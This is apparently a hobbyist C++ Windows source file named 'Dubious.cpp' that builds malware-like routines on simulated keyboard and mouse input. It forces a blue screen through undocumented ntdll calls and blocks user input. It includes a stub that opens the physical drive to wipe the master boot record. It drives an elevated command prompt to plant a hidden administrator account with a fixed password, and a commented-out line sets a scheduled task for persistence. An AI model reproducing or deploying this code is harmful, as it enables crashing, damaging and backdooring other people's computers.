// Dubious.cpp : Defines the entry point for the console application.
//

// ConsoleApplication1.cpp : Defines the entry point for the console application.
//
#define _WIN32_WINNT 0x0500
#include "stdafx.h"
#include <Windows.h>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#pragma comment(lib, "ntdll.lib") //linking the ntdll.dll
using namespace std;

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN); //hidden ntdll.dll function, adjust privilege for non-user
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response); //Crash computer through hard error  

//Keystroke injecting class

class bot {
public: 
	bot(); 
	void kup(char key);
	void kdown(char key); 
	void klick(char key); 
	void typesen(char *sen); 
private: 
	INPUT _buffer[1];
	HKL keyboard = GetKeyboardLayout(0); 
};

bot::bot() {
	_buffer->type = INPUT_KEYBOARD;
	_buffer->ki.wScan = 0;
	_buffer->ki.time = 0;
	_buffer->ki.dwExtraInfo = 0;
}

void bot::kup(char key) {
	_buffer->ki.wVk = VkKeyScanEx(key, keyboard);
	_buffer->ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, _buffer, sizeof(INPUT));
}
void bot::kdown(char key) {
	_buffer->ki.wVk = VkKeyScanEx(key, keyboard); 
	_buffer->ki.dwFlags = 0;
	SendInput(1, _buffer, sizeof(INPUT));
}
void bot::klick(char key) {
	kdown(key);
	Sleep(10);
	kup(key); 
}
void bot::typesen(char *sen) {
	for (unsigned i = 0; i < strlen(sen); i++) {
		klick(sen[i]); 
	}
}
void runsyscmd(const char *sh) {
	system(sh);
}
/*
struct Mathy {
private:
	double a; 
	double b;
public:
	Mathy(double s, double t) {
		a = s;
		b = t;
	}
	Mathy operator+(Mathy &object) {
		return Mathy(a * object.a, b * object.b);
	}
	void Display() {
		cout << a << endl; 
		cout << b << endl;
	}
};
*/
int findstring(const char *b, const char *a) {
	unsigned counter = 0;
	int retval = 0;
	if (!(strlen(b) > strlen(a))) {
		for (unsigned i = 0; i < strlen(a); i++) {
			if (a[i] == b[counter]) {
				counter++;
			}
			else{
				counter = 0;
			}
			if (counter == strlen(b)) {
				retval = 1;
				break;
			}
		}
	}
	return retval;
}

void LeftClick()
{
	INPUT    Input = { 0 };
	// left down 
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
	::SendInput(1, &Input, sizeof(INPUT));

	// left up
	::ZeroMemory(&Input, sizeof(INPUT));
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
	::SendInput(1, &Input, sizeof(INPUT));
}

void RightClick() {
	INPUT    Input = { 0 };
	// left down 
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
	::SendInput(1, &Input, sizeof(INPUT));

	// left up
	::ZeroMemory(&Input, sizeof(INPUT));
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
	::SendInput(1, &Input, sizeof(INPUT));
}
void getmouse() {
	POINT p; 
	while (true) {
		Sleep(1000);
		if (GetCursorPos(&p)) {
			cout << "X: " << p.x << endl;
			cout << "Y: " << p.y << endl;
		}
	}
}

void MonitorOff() {
	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
}

BOOLEAN BlockInput() {
	int succ = BlockInput(true); 
	return succ > 0 ? TRUE : FALSE; 
}

void bsod() {
	BOOLEAN bl; 
	unsigned long response; 
	RtlAdjustPrivilege(19, true, false, &bl); 
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
}
//Press windows command key
void WindowsCommand() {
	keybd_event(VK_CONTROL, 0, 0, 0);
	keybd_event(VK_ESCAPE, 0, 0, 0);
	Sleep(10);
	keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
}
//Kill MBR
void MBRDie() {
	DWORD write;
	char mbrData[512]; 
	ZeroMemory(&mbrData, (sizeof mbrData)); 
	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL); 
	CloseHandle(MBR); 
}
//Make a cron job

//Move mouse to specific coordinates
void MouseMove(int x, int y)
{
	double fScreenWidth = ::GetSystemMetrics(SM_CXSCREEN) - 1;
	double fScreenHeight = ::GetSystemMetrics(SM_CYSCREEN) - 1;
	double fx = x*(65535.0f / fScreenWidth); 
	double fy = y*(65535.0f / fScreenHeight);
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
	Input.mi.dx = fx;
	Input.mi.dy = fy;
	::SendInput(1, &Input, sizeof(INPUT));
}
//Gain administrator access via UAC
void winadmin() {
	keybd_event(VK_CONTROL, 0, 0, 0); 
	keybd_event(VK_SHIFT, 0, 0, 0); 
	keybd_event(VK_RETURN, 0, 0, 0); 
	Sleep(10); 
	keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0); 
	keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0); 
	keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0); 
}

//Gain administrator access in windows
void gainaccessWin(bot &object, string name) {
	string cron = "schtasks /create /tn \"system\" /tr c:\\%TEMP%\\" + name + ".exe /sc onidle /i 25 /RU NetAdmin /RP NullSec"; 
	WindowsCommand(); 
	Sleep(500);
	object.typesen("cmd");
	Sleep(500);
	winadmin(); 
	Sleep(500);
	keybd_event(VK_LEFT, 0, 0, 0);
	keybd_event(VK_LEFT, 0, KEYEVENTF_KEYUP, 0);
	Sleep(500);
	object.klick(VK_RETURN); 
	object.typesen("net user NetAdmin Nullsec /Add");
	Sleep(500);
	object.klick(VK_RETURN);
	Sleep(500);
	object.typesen("net localgroup administrator NetAdmin /Add");
	Sleep(500);
	object.klick(VK_RETURN);
	Sleep(500);
	object.typesen("net user NetAdmin /active:no");
	Sleep(500);
	object.klick(VK_RETURN);
	//object.typesen(cron.c_str); 
	//object.klick(VK_RETURN);
	object.typesen("exit"); 
	Sleep(500);
	object.klick(VK_RETURN);
}

